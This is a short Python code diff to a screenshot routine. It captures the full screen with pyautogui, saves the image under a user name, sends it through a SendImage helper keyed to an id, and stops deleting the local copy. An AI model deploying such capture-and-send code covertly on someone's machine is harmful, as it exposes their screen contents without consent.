@@ -11,13 +11,16 @@ class Take():
 		self.id = id
 
 	def take_screenshot(self):
-		image_name = f"{self.u_name}-{str(datetime.now())}"
+		image_name = f"{self.u_name}"
 		myscreen = pyautogui.screenshot()
-		myscreen.save(f'{image_name}.jpg')
-		temp = SendImage(self.id, f'{image_name}.jpg')
+		cur_path = os.getcwd()
+		print(cur_path)
+		myscreen.save(f'{image_name}.jpeg')
+		print(f'{image_name}.jpeg')
+		temp = SendImage(self.id, f'{image_name}.jpeg')
 		temp.send()
 		# temp = Upload(f'{image_name}.png').drive_upload()
-		os.remove(f'{image_name}.jpg') # Remove photos from local for storage optimization
+		# os.remove(f'{image_name}.jpg') # Remove photos from local for storage optimization
 
 	def main(self):
 		print("Taking screenshot")
